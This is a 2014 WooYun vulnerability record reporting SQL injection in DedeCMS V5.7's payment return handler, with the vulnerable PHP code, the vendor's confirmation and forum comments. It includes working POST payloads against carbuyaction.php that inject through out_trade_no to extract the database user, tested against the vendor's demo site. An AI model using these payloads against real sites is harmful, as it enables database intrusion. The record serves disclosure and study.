{"id": 1604, "wybug_id": "wooyun-2014-063744", "wybug_title": "DedeCMS-V5.7-UTF8-SP1 sql注入", "wybug_corp": "Dedecms", "wybug_author": "menmen519", "wybug_date": "2014-06-06 17:31", "wybug_open_date": "2014-09-04 17:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足", "源码审核", "注射漏洞利用技巧", "源码分析", "后台验证绕过"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-09：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-04：\t细节向公众公开  简要描述： DedeCMS-V5.7-UTF8-SP1 代码审计sql注入  详细说明：  织梦在/include/payment/alipay.php(lines:125-161)\nif (!empty($_POST))        {            foreach($_POST as $key => $data)            {                $_GET[$key] = $data;            }        }        /* 引入配置文件 */\t\t$code = preg_replace( \"#[^0-9a-z-]#i\", \"\", $_GET['code'] );\t\t//require_once DEDEDATA.'/payment/'.$code.'.php';        /* 取得订单号 */        $order_sn = trim($_GET['out_trade_no']);        /*判断订单类型*/        if(preg_match (\"/S-P[0-9]+RN[0-9]/\",$order_sn)) {            //检查支付金额是否相符            $row = $this->dsql->GetOne(\"SELECT * FROM #@__shops_orders WHERE oid = '{$order_sn}'\");            if ($row['priceCount'] != $_GET['total_fee'])            {                return $msg = \"支付失败，支付金额与商品总价不相符!\";            }            $this->mid = $row['userid'];            $ordertype=\"goods\";        }else if (preg_match (\"/M[0-9]+T[0-9]+RN[0-9]/\", $order_sn)){            $row = $this->dsql->GetOne(\"SELECT * FROM #@__member_operation WHERE buyid = '{$order_sn}'\");            //获取订单信息，检查订单的有效性            if(!is_array($row)||$row['sta']==2) return $msg = \"您的订单已经处理，请不要重复提交!\";            elseif($row['money'] != $_GET['total_fee']) return $msg = \"支付失败，支付金额与商品总价不相符!\";            $ordertype = \"member\";            $product =    $row['product'];            $pname= $row['pname'];            $pid=$row['pid'];            $this->mid = $row['mid'];        } else {                return $msg = \"支付失败，您的订单号有问题！\";        }\n 其中大家可以看到137行直接通过$_GET获取订单号： $order_sn = trim($_GET['out_trade_no']); 这里并没有做任何处理，但是奇怪的是上面有个require_once地方只要这里引入，就不会继续往下执行，只有两种可能性，要么是程序支付逻辑接口缺陷，要么就是需要其他外界条件，我们暂且注释掉这一行 //require_once DEDEDATA.'/payment/'.$code.'.php';下来我们看文件/uploads/plus/carbuyaction.php(lines:334-337)\n} else if ($dopost == 'return') { $write_list = array('alipay', 'bank', 'cod', 'yeepay'); if (in_array($code, $write_list)) { require_once DEDEINC.'/payment/'.$code.'.php'; $pay = new $code; $msg=$pay->respond(); ShowMsg($msg, \"javascript:;\", 0, 3000); exit(); } else { exit('Error:File Type Can\\'t Recognized!'); } }\n走到这里我们一下明白了整个支付逻辑,然后我们构造请求如下： url:http://localhost/DedeCMS-V5.7-UTF8-SP1/uploads/plus/carbuyaction.php post_data:dopost=return&code=alipay&out_trade_no=S-P0098RN0098' 后台监控到的sql语句为: SELECT * FROM dede_shops_orders WHERE oid = 'S-P0098RN0098'' LIMIT 0,1 看到此处大家都明白了，所以可能是自己没有办法去操作一整套支付流程，也可能是织梦支付接口缺陷导致 到这里位置，唯一可以肯定的就是，这一段代码肯定是有问题，而且是大问题，目前还在挖取，相关织梦已建站这一块    漏洞证明：  为了验证自己的猜想，我们上官方的演示站点：http://v57.demo.dedecms.com/plus/carbuyaction.phpurl:http://localhost/DedeCMS-V5.7-UTF8-SP1/uploads/plus/carbuyaction.php post_data:dopost=return&code=alipay&out_trade_no=M1T1RN1' or concat(char(@`'`),(SELECT user())))#证实逻辑完全符合猜想：\n\n\n\n   修复方案：  过滤特殊字符   版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2014-06-06 19:41 厂商回复： 已修复，感谢提交 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-06 17:33 |    \t\tdlevr \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:10        | 菜鸟一只，大神勿喷！)\t\t \n  沙发是我的！    \n     2014-06-06 17:37 |    \t\t邪恶大咖 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        )\t\t \n  卖黑阔了，两块钱一斤！    \n     2014-06-06 17:37 |    \t\tMeTeOrs \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | 永远不要以正常的思维对待你的目标！)\t\t \n  前排出售各种小吃    \n     2014-06-06 17:40 |    \t\tbey0nd \t\t\t( 普通白帽子  |\t\t\t        Rank:895 漏洞数:142        | 相忘于江湖，不如相濡以沫)\t\t \n  nice    \n     2014-06-06 18:57 |    \t\t帅爆的小烬烬 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:25        | 路上有个漂亮妹子和我搭讪，知道我赶着去挖...)\t\t \n  前排观望，本人帮刷QB支付50￥刷10QB，欢迎联系    \n     2014-06-06 19:03 |    \t\t小鸡鸡 \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:10        )\t\t \n  找个玩渗透网站的、教我玩渗透、我给他8位qq和情侣qq。(qq都是04年和05年前的。    \n     2014-06-06 19:37 |    \t\t小权 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 小菜鸟，求各位大姐大哥多多指教)\t\t \n  卧槽，楼上都是大牛，后排出售瓜子，可乐，优乐美。。。    \n     2014-06-06 19:43 |    \t\tByakuya \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:3        | /whitehat_detail.php?whitehat=Byakuya)\t\t \n  磨剪子嘞 戗菜刀    \n     2014-06-07 10:14 |    \t\t五色花 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | jvav)\t\t \n  磨剪子嘞 戗菜刀     \n     2014-06-08 18:53 |    \t\t暧昧 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 此号乃是吾用来装孙子也)\t\t \n  顶个    \n     2014-06-09 11:01 |    \t\t奋斗的猴子 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | IT界的一名屌丝)\t\t \n  求细节！    \n     2014-06-10 07:31 |    \t\t07@jyhack.com \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:10        | 希望和大家多多交流，多多沟通、)\t\t \n  卧槽，楼上都是大牛，后排出售瓜子，可乐，优乐美。。。    \n     2014-06-10 09:12 |    \t\tby:龙少 \t\t\t( 普通白帽子  |\t\t\t        Rank:304 漏洞数:74        | 信息安全，学习、进步、共勉！)\t\t \n  卧槽，楼上都是大牛，后排出售雪碧，可乐，优乐美。。。    \n     2014-06-10 10:31 |    \t\txiaoshi \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:2        )\t\t \n  ...毁梦CMS    \n     2014-06-12 11:20 |    \t\tBMa \t\t\t( 普通白帽子  |\t\t\t        Rank:1776 漏洞数:200        )\t\t \n  又出了，，    \n     2014-06-12 15:33 |    \t\t123丶 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 初学菜鸟一只，请多指教)\t\t \n  卧槽，楼上都是大牛，后排出售节操，贞操。。。     \n     2014-07-18 12:52 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  漏洞挖掘追求完美和谐的利用    \n     2014-11-22 19:57 |    \t\t小菜大师 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  不错  有没有最新dedecms exp秒杀的？.    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}